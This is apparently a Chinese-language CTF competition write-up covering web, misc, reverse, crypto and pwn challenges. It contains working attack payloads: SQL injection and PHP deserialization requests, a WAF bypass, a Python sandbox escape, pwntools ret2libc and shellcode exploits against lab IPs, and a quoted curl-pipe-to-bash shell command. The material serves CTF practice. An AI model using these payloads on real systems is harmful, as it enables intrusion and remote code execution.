## Web

#### 签到

得到flag的条件：`md5($_POST['name']) === sha1($_POST['password']) `

考察的是md5和sha1函数无法处理数组的特性，处理结果都是NULL

payload：

```
name[]=1&password[]=2
```

flag：`flag{WelCome_To_Fafu_2019_ctf} `

#### login1

扫描目录发现存在**.git泄露**

使用**githack**进行还原即可

还原后发现flag文件：`{975fdb8c8c79c7c9502834c1baf02b36}`

#### sqli

提示：`id is not in whitelist. `

猜测注入点在参数`id`，GET传参`id=1`得到回显信息

经过fuzz测试，题目通过黑名单的方式过滤了`or`，`union`，`*`，`benchmark`，`sleep`，`if`，`case`

无法使用联合注入，盲注，但是报错注入函数`extractvalue`和`updatexml`都未被过滤

尝试payload：

```
?id=1 and extractvalue(1,concat(0x3a,database(),0x3a))%23
```

发现`concat`又被过滤了，但是可以用`make_set`函数来代替

注数据库名payload：

```
?id=1 and extractvalue(1,make_set(3,'~',database()))%23
```

数据库名：`web`

因为这里`or`被过滤了，所以无法使用`information_schema`库得到表名和列名

猜测列名flag在表名flag中：

```
?id=1 and extractvalue(1,make_set(3,'~',(select flag from flag)))%23
```

得到flag：`flag{1n0rRY_i3_Vu1n3rab13} `

#### 黑曜石浏览器

抓包发现响应包头部字段藏有提示字段：`hint: include($_GET["file"])`

提示考察文件包含，使用php伪协议读取index.php源码：

```
?file=php://filter/convert.base64-encode/resource=index.php
```

```php
<?php 

error_reporting(0);

if(!isset($_GET['file'])){
	header('hint:include($_GET["file"])');
	include('heicore.html');
}

$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];
include($file); //class.php
if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
	echo "hello admin!<br>";
	if(preg_match("/f1a9/",$file)){
		exit();
	}else{
		$pass = unserialize($pass);
		echo $pass;
	}
}else{
	echo "you are not admin ! ";
}


 ?>
```

`file_get_contents`函数同样用伪协议`php://input`利用

源代码中还给了提示文件`class.php`，同样方法读取源代码：

```php
<?php
class Read{//f1a9.php
public $file;
public function __toString(){
if(isset($this->file)){
echo file_get_contents($this->file);
}
return "__toString was called!";
}
}
```

发现是一个Read类，其中魔术方法`__toString`在当对象被当做字符串时候会自动调用，调用后会执行`file_get_contents`函数读取文件，结合`class.php`中的反序列化函数`unserialize`，我们可以构造对象的序列化字符来读取`f1a9.php`文件

构造序列化字符的代码如下：

```php

<?php
class Read{//f1a9.php
public $file;
public function __toString(){
if(isset($this->file)){
echo file_get_contents($this->file);
}
return "__toString was called!";
}
}

$r = new Read();
$r->file = "f1a9.php";
echo serialize($r);
?>
```

得到的序列化字符：

```
O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}
```

最终payload：

```
POST /?file=class.php&user=php://input&pass=O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";} HTTP/1.1
Host: 172.31.19.47
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _ga=GA1.1.1968814565.1555932724; _gid=GA1.1.1377480033.1555932724
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 17

the user is admin
```

#### login2

密码字段过滤了`'`，`#`，`||`，`or`

在用户名字段尝试`admin'#`，回显的信息为：`Wrong username / password. `

尝试`admin' or 1#`，回显的信息为：`Wrong password for users `

回显的信息不同，猜测用户名`admin`其实是不存在的，并且后台还对我们输入的密码进行了验证

`admin' union select 1,2#`，回显信息：`Wrong password for 1 `

有注入点，开始常规注入，数据库名为`fafuctf`，表名为`users`，列名为`username,password`

注password：

```
username=admin' union select group_concat(password),2 from users#&password=1
```

password：`8235020a76bf2f8e3e30c500c3f309220d26c544 `

同样的方法注出用户名为：`users`

尝试登陆但是失败，观察密码字段

猜测密码字段经过加密，从40位字符可以猜到是`sha1`加密，结合前面的分析，可以猜测出，后台进行的密码验证为`$row['password'] === sha1($_POST['password'])`

我们可以通过union构造password字段的查询值，所以最终payload为：

```
username=admin' union select 1,sha1(2)#&password=2
```

flag：`flag{SqLi_InjEc4ion_Is_So_E@Sy} `

#### Blog

扫描后台发现存在备份文件`www.zip`

审计源码，网站目录如下：

```
html tree
.
├── passage
│ ├── title.php
│ ├── words.php
├── templates
│ ├── About.php
│ ├── Flag.php
│ ├── Link.php
│ ├── passage.php
├── class.php
├── index.php
├── waf.php
```

审计源码

在index.php中，发现可以通过参数`$_GET['page']`执行命令，但是该参数经过waf和`file_exists`的过滤处理，

所以无法通过`$_GET['page']`函数执行命令

另外发现了反序列化函数，猜测可以构建类，正好根目录下存在文件`class.php`

跟踪`class.php`，虽然同样有waf，但是可以绕过，最终payload：

```
POST /?page=Passge&tip=php://input&tips=O:4:"Blog":1:{s:4:"file";s:26:"%26/bin/ca?%09./templates/Flag";} HTTP/1.1
Host: 172.31.19.53
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

you got this
```

这个payload其实使用了统配符来绕过WAF，在linux下，/bin/ca? 相当于/bin/cat 。由于过滤了符号 '<' 和空格，所以无法使用 cat ./templates/Flag ，但是我们可以使用%09（Tab）来替换空格，绕过WAF。

另外要注意的是`file`值`%26/bin/ca?%09./templates/Flag`的长度，`%26`会被URL解码为`&`，`%09`会被解码会`Tab`，所以`%26`和`%09`长度都相当于1

赛后从福大师傅那里得知单引号能绕过黑名单过滤`ca''t`，他们给的payload是`tips=O:4:"Blog":1:{s:4:"file";s:18:"%;c''at%09./waf.php;";}`

另外福大师傅还有`;cu''rl\$IFS\$9{x.x.x.x}|bash; `直接拿shell的方法

#### fakebook

注册信息后，在`view.php`页面，发现url存在参数`no`存在sql注入，过滤了`union select`，采用`/**/`代替空格

+ 注库：`?no=0%20union/**/select%201,database(),3,4`
+ 注表：`?no=0%20union/**/select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=database()`
+ 注列：`?no=0%20union/**/select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%27users%27`
+ 注data：`?no=0%20union/**/select%201,data,3,4%20from%20users`

发现data是一串序列化字符串，并且给出了类的所有信息，结合页面`age`和`blog`字段无法显示以及反序列化函数报错信息，猜测后台将`data`信息取出进行了反序列化处理，并且，在页面下方通过`iframe`标签将博客页面访问出来，说明可能利用了php的`curl`扩展对我们注册的博客信息进行请求，并将请求获得的页面内容通过`iframe`标签显示出来，说明可能存在`SSRF`漏洞，其原理与读取文件类似，我们通过报错信息知道了网站的绝对目录，便可以利用`file`协议进行读取任意文件，但是要注意需要序列化处理

最终获得flag的payload：

```
?no=0%20union/**/select%201,data,3,%27O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:12;s:4:"blog";s:29:"file:///var/www/html/flag.php";}%27%20from%20users
```

将得到的页面内容进行base64解密后获得flag

## misc 

#### 字符偏移

考察 Linux 文件重定向  `flag{You_F0und_4_Supr1s3_1n_These_Bug5:)}`

- 环境部署：

  1.服务端运行 `python server.py`， 并修改 client.c 中的 ip 和 port
  2.编译 `gcc client.c -o bugProgram` 并下发

- 题解：

  1. ./bugProgram 1>/dev/null 即可得到 flag
  2. 也可以 wireshark 抓取流量, 再分析程序流程还原 flag

#### sandbox

考察 Python3 沙盒绕过    `flag{Awes0me_Pyth0n_&_Aw3s0me_Cl4ss}`

- 环境部署：
  1. 修改 flag 权限防止搅屎 `chmod o-w flag.txt`
  2. 服务端执行 `socat tcp-listen:8999,fork exec:"./run.sh",stderr`
  3. 做题通过 `nc ip 8999`
- 题解：
  - Fuzz 之后发现限制了 import system os bash sh 等关键字, 使用 Python 内建函数以及类的继承绕过限制, 执行 cat flag.txt. Payload: 
    `print(''.''.__class__.__mro__[1].__subclasses__()[93].__init__.__globals__['sys'].modules['o'+'s'].spawnlp(0, 'cat', 'cat', 'flag'))`
    其中 `__subclasses__()[93]` 是 `<class 'codecs.StreamReaderWriter'>` 的索引， 视具体情况而定
    `s = ''.__class__.__mro__[1].__subclasses__()`
    `for i in s: print(str(i) + ' ' + str(s,index(i)))`

#### 图片隐写

考察png的基本格式
首先把图片开头的几个nop删掉，然后得到图片
之后修改图片宽度，得到写有flag的图片
python脚本如下：

```python
for i in range(16,256):
    b=hex(i)[2:]
    a=('89504E470D0A1A0A0000000D49484452000003'+b+'000001530802000000989E251C000000017352474200AECE1CE90000000467414D410000B18F0BFC61050000000970485973000012740000127401DE661F7800000B0349444154785EEDDD4B76A3C81200D0DA80861A6BA89987F5F6BFB3973F10E447266D49B6AAEF9D741982CC48A04F4421E4FA030000000000000000000000000000000000000000000000F0DF743A5F2ED7E47C8A3F9ECE51FC23BC3DF73300FF98D3E5E3EFDFFF2DAEE7B0E97CFD1B7C5C5E56EE62797DC7DA7AEB7A93CBE57CD222FC3E0FBC9FE38DEA1203F0B362EF169AB650DA42554AC2C657766FE7EB92C05B15C553C83BB5BBB5D4FEF2AB3CEE7E5EFEAAF3E13203F06352356A0ADBEBBAB73053A8857F43317CA7DEADB4BCA98A5FD28772D1E5121AD1BFBBB21E7BBC8F776B4CFF3D8FBC9F4FE7D2C0E9DF00F821A57BAB2AD1CBBAB73CFDBB7537E76B28DE87D2CE91BAB71FF6E8FB395F56ED1B003FA334223FD5BDE589DEAC0C8696F3684FA67BFB151E7D3FE7BF74E8DE0078B5FC3DBCDC8884C2963EFB5BBE3A30A876E190F48EFE4770BDDE7B433F076EC3F2B7FEEACF47BBDDDBEE1B82F97B0179A43054DAB655076FB24B9B5A47731B3AD4BDE5314BE4FAF16A73C6F2295D53FE7ECE9F5FA3F93316A3CAFC31EE4E607028D56D0E25E1DD67E7F3ABC8CB1864B7BB9FD3D0EBC0697FB2A4D91E1E94D9CA3EDD1B003F233D16AA2C05AEEDDEFA2FE9C7F7D54AC0AA1319DB977EC7D3EDDED6D96391CC23AC06237482C3C626B9A9DCC6965377E788DCE155AA95B63129E76ACCE3391FBC4653672C24195FE62B118B5E9EC1F154D71CC21165F0E5DC7C7715C17EAEE05EF03A6EBE1CCDB151D9B50D0DE3B5270B009E2B3FBCC8652994ACF46C617996B156BBF45314EBD5477C86541E3F9C9677B7AB1A168ECC03A6D064898CDBFB65B55F983FC261FB61CA20BBF05DF0121B3B8E18D984A68D0773BBE3D604C433D73D2C3FAC290D419830BB3DD8290D414A3A6F28C1FB3C66723E788D26CE584E32B87D23390CBA7457ED650B1B8FA55A72B8C6CEB09C9DCB250FF795556C272CD37DBEE4D238DE961C678E61CD7D107784C8DB9039B25A3F00BCC8D1F7DE62B92B7F5CB52F75A5AAB6AB73D9B2BDA98C79A2CEECBDACE23069FB769425B81AB9CD643AB7FB62BF138ECA52FF5076EC8CDE7B4B93B68D4259E09AE25CCEC7AED1F7CF581AA21E612ED5E1259E5EC5436F92B2AE6AC814B69B286F697307805738DABDF53455AD14CEDE71A52E56BBFACD4DA9B5836176E5B6B7258BC96D0799CEED80F41C2A1E9BAD8FD16E06DD5B49A62DFFFB53FA809CF703260F3863CBB0B77D93A9961CBA63778C573198B05AE0274BBE6DEFFDEF90F3DF4F1407ACC200E05526BBB753FC40707D833D56B5EDB1BD3A57B4D53D753EDD5986B307CD14C3E02A722AB729F123B8A587AB07E9776FA569281F196E9573524EE9D772BE7F8D0E9FB125C9DEECEBDE75DCC954630EDBC35B5F5E45D024330CEE46EE13EB1FBB2C2A5CC2B205005EE570F7965E138A856DD5D4D4BAA26F3525BC04779E570DEA65D62DB7070AF3546E5F3078E3EA6EF736B29CD2E99C0F5CA3E001676CDD7B24B897EA3087E09BAB08F60B090E2E392AD9AE53E52BD82E2CBD8E571D0B002F71B07B2B61E5FDF0B23196EC603D76B68487329DAA727DC0B0D6064DB91D06EF236773FB8A32CE763D77BBB7D0B90EE4533C99F3A16B143CE08CDD967020B893EA3887EFAF22D82F2438B8E4643F570E68D6B5AEB7373D003CD7A1EEADD4AABAFAD535751096847D71A26A5F1EA13E60586BF3AE5435CBCF778273DD5D76CCE7F6057939DB81FADD5B95DBC854CE83E092D2F6FA1E3C63F7938C8384BDCBB853A906A31C1EB08A26B760181C76B4D3E58DE9F07CE076DE24E7D39D1C009EEE50F7167FDC97C3A854E5CDB1BD3A9D95AADCECEA56C7325D6798E5C1CC664F95EA4DD8B11D643EB779EDC91C746FE3647666723E7A8DA6CF587D759266A533A906A31CE656113676979182B77B8E2EB9C8235CCF79DECE61714DFD130300CFD7361C5155ED4A01DE95B154C0EA63978DFB82573E218DC16D9D8C1375668FC155741C266DDF8557A9DEE4496F3BA6731B0A23A5DF1A567E2CD2EB5A719C6D7AFDD33B4A263A9D37BF7C6422E7185A472E87EF13387CC652643CBCFA8070B910DDB9F6E38E4EEF2887B955A48DED8469FBD76E9222C75FAFF13F9DA3724AED5505809738D4BDC56A15C2629DFB08252D7E0F30FE39FDAED5EAD83532FEC6D51C9A86CA8734A5B094C9EEECF95DF5ED8C7184CF525D851DF1F0CD8EC9DC866EE3C424E33039D5BC653F4A4C2F6ECF137EDCBEA1B81D24ED8B723EDB118EE7BC466ECF588C8BF1DB933671C6E2A04B93B464B9E6530F703CD53B39CCAEE2E13749B6594B7B50392DF52400F022C7BAB750AFCE4B69CCE2BE5CC39A2256FDDB4AA17C9F536CFC731D9B271ACDDE4C7AEDD6DF1C5C7E5E750BF34C6E63CBBF4C50496FDA97909BCD3728AB95C6E56D9209623B523DE89AC8F9E0359A3B6339CB3C60168EED2E34389CEA3087F9553CFE2689D28C61D72EEB55CEA7BF0F007E97F87BF06FDF04BCAB842EB1BD121EE4B25A6DAD6A6D19E8D0ACC794013FC9ED736598A86C19B91794F74565435709F93CE77DDCC394618F0C5C023F4FF58EFD101D4FBE49727F364A7A7931AEFC0800FFA2580C43C16B1E72E422596D1E3E29798E516EBFD91BE5FCA4549F7B9384D1EFF4676149EF76C300C0ACF2F96CAFDEA55DB116DE3E317C6DF77627B75FEB8D727E56AA4FBD49C6832F9F23BFD90D030063A1ECE5DFB35A7E8EE56E79176AF8242314C48F8F4D357C5261FE4A6E3FED8D727E71AA4FBA4982F2B0B09F73DCD97B391100DE56ACA9A1F2B566EADD930AF3C1DC4EF1DFD61C7BED1397879CCFD77871AA4FB84996C7C0C153DA4200F8A54EF1894BFA97C58BEB65F005C5A1F42C2E1CF7F0FA7928B73CFBD0AB1F783DE07CBECA4B537DC24DB25CF9D1376A01000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FE4BFEFCF93F29520FC4D05FB0A10000000049454E44AE426082').decode("hex")
    f=open('1\\'+b+'.png',"wb")
    f.write(a)
    f.close()
```

## reverse 

#### patch

考察 IDAPatch 的使用     `flag{why_need_so_large_ram_emmmmmmm}`

- 环境搭建：

  1. 直接下发 `fakeRam` 程序

- 题解：

  利用 IDAPatch nop 掉所有严重与等待后重新运行即可自动输出 flag

#### c++STL

考察c++STL容器基础

开始创建三个vector容器
第一个放入输入的16个数字
第二个放入从500开始的16个素数
第三个倒序放入第一个容器的16个数字
比较第三和第二个容器
相等则得到flag

## crypto 

#### sha256

```python
from hashlib import sha256
sssk=string.printable
text2="sha256_is_too_"
text1="6348306011488e60120a6b99fbbb13f09336235fb790f8f904e97846b1418e48"
#sha256_is_too_e@$Y
for i1 in sssk:
	for i2 in sssk:
		for i3 in sssk:
			for i4 in sssk:
				text3=text2+i1+i2+i3+i4
				if sha256(text3).hexdigest()==text1:
					text4=i1+i2+i3+i4
					print i1+i2+i3+i4
					break
				else: continue
			else: continue
			break
		else: continue
		break
	else: continue
	break
print text3
```

得到flag

#### DES

考察简化的DES差分分析

```python round1.py
#SBOX = [[[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7], [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8], [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0], [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]], [[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10], [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5], [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15], [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]], [[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8], [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1], [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7], [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]], [[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15], [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9], [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4], [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]], [[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9], [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6], [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14], [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]], [[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11], [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8], [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6], [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]], [[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1], [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6], [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2], [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]], [[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7], [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2], [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8], [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]]]
#为了方便这里只选择SBOX中的S1盒进行演示
def Sbox(a,b):
	sbox1=[[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7],
		[0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8],
		[4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0],
		[15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]]

	#存储S1盒output的异或值
	sout_table=[0]
	sout_text=['']
	for i in range(0,64*16):
		sout_table.append(0)
	for i in range(0,64*16):
		sout_text.append('')

	for Si in range(0,64):
		for Se1 in range(0,64):
			Se2=Se1^Si
			
			#计算Se1经过S1盒的值
			bits1 = bin(Se1).replace('0b','').rjust(6,'0')
			row1 = int(bits1[0])*2+int(bits1[5])
			col1 = int(bits1[1])*8+int(bits1[2])*4+int(bits1[3])*2+int(bits1[4])
			val1 = bin(sbox1[row1][col1])[2:]

			#计算Se2经过S1盒的值
			bits2 = bin(Se2).replace('0b','').rjust(6,'0')
			row2 = int(bits2[0])*2+int(bits2[5])
			col2 = int(bits2[1])*8+int(bits2[2])*4+int(bits2[3])*2+int(bits2[4])
			val2 = bin(sbox1[row2][col2])[2:]
			So=int(val1,2)^int(val2,2)
			
			#将相应表项加1
			sout_table[Si*16+So]=sout_table[Si*16+So]+1
			sout_text[Si*16+So]=sout_text[Si*16+So]+str(Se1).zfill(2)
	'''
	for i in range(0,64):
		s=str(i)+" : "
		for j in range(0,16):
			s=s+str(sout_table[i*16+j])+"  "
		print(s)
	'''
#	print(sout_text[a*16+b])
	return sout_text[a*16+b]
```

```python 
from round1 import *
from des import *

def decry_xor(decry1,decry2,num):
	a=decry1[num*4:num*4+4]
	b=decry2[num*4:num*4+4]
	return int(a,2)^int(b,2)
def en_xor(number1,number2,number3):
	num1=E_change(bin(chain[number1])[2:].zfill(32),number3)
	num2=E_change(bin(chain[number2])[2:].zfill(32),number3)
	return num1^num2,num1,num2
subkey=bin(0x987654321098)[2:]
print(subkey)
chain=[0x92d91525,0x81c82636,0xa3d71597,0xc2a41239,0xa4824698,0x45681249]
#密文
#0x6148b286                                                                                                              #0x7d4d21d3                                                                                                              #0xaecabffe                                                                                                              #0x74d08779                                                                                                              #0xc8e3d2a4                                                                                                              #0x8d9d872f 
cipher=['01100001010010001011001010000110','01111101010011010010000111010011','10101110110010101011111111111110','01110100110100001000011101111001','11001000111000111101001010100100','10001101100111011000011100101111']
'''
for i in range(6):
	plaintext=bin(chain[i])[2:].zfill(32)
	cipher[i]=(F(plaintext,subkey))
print(cipher)
'''
en_xo=[[],[],[]]
def getkey(a,b,c):
	en_xo=en_xor(a,b,c)
	#print(en_xo)
	de_xo=decry_xor(cipher[a],cipher[b],c)
	result=Sbox(en_xo[0],de_xo)
#	print(result)
	resu=['','','','','','','','','','','','','','','','','','','','','','','','','','','','']
	for i in range(int(len(result)/2)):
		resu[i]=(result[2*i]+result[2*i+1])
	print("key:")
	for i in range(int(len(result)/2)):
		print(en_xo[1]^int(resu[i]))
	#	print(en_xo[2]^int(resu[i]))
a=int(input())#第a+1个明文
b=int(input())#第b+1个明文
c=int(input())#明文的第c+1至c+5个bit位
getkey(a,b,c)
```

根据明文和密文，每两对4bit的明文和6bit的密文可以获得一组key，多组明文密文的组合可以得到做个key的集合，最后几个集合的交集就是key，8个key合在一起就是subkey，有了key就可以进行解密，然后得到明文flag

## pwn

#### 001

考察基础的ret2libc和ret2plt 

```python
from pwn import *
 
#context.log_level = 'debug'
 
 
 
s=process("./pwn")
 
#gdb.attach(s)
 
elf=ELF('./pwn',checksec=False)
 
libc=ELF('/lib/i386-linux-gnu/libc.so.6',checksec=False)
 
 
 
write_plt=elf.plt['write']
 
write_got=elf.got['write']
 
game_addr=elf.symbols['game']
 
write_libc_addr=libc.symbols['write']
 
system_addr=libc.symbols['system']
 
sh_addr=next(libc.search('/bin/sh'))
 
 
 
payload='a'*88+p32(write_plt)+p32(game_addr)+p32(1)+p32(write_got)+p32(4)
 
s.sendlineafter("name ?\n",payload)
 
#gdb.attach(s)
 
s.sendlineafter("? (0 - 1024)\n","123")
#gdb.attach(s)
 
write_addr=u32(s.recvuntil("What'")[-9:-5])
 
 
print hex(write_addr)
 
base_addr=write_addr-write_libc_addr
 
 
 
payload='a'*88+p32(system_addr+base_addr)+p32(game_addr)+p32(sh_addr+base_addr)
 
s.sendlineafter("name ?\n",payload)
 
s.sendlineafter("? (0 - 1024)\n","123")
 
 
 
s.interactive()
```

#### 002

考察基础的ret2shellcode

```
from pwn import *
sh=remote('172.20.3.35',9999)
#sh = process('./Bin')
shellcode = asm(shellcraft.i386.linux.sh())
#buf2_addr = 0x0804853b
hin_addr=0x080484ed
#gdb.attach(sh)
sh.sendline("a"*108+shellcode[0:4] + p32(hin_addr)+shellcode[4:])
sh.interactive()
```





